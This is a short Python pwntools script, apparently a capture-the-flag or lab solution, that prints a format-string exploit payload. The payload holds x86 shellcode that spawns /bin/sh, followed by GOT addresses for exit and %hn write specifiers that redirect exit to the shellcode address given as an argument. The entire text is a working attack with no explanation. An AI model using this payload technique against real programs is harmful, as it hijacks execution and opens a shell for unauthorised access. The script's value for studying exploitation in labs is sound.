from pwn import *
import sys

exit_got=0x080499b8
addr_shell=int(sys.argv[1])
shellcode="\x31\xC0\x83\xEC\x04\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80"

payload=""
payload+=shellcode      #28bytes
payload+=p32(exit_got+2)#4bytes
payload+=p32(exit_got)  #4bytes
value_high=addr_shell>>16
value_low=addr_shell&0xffff
value_low=value_low or 0x1fff
payload+="%"+str(value_high-36)+"x%13$hn"
payload+="%"+str(value_low-value_high)+"x%14$hn\n"
print(payload)
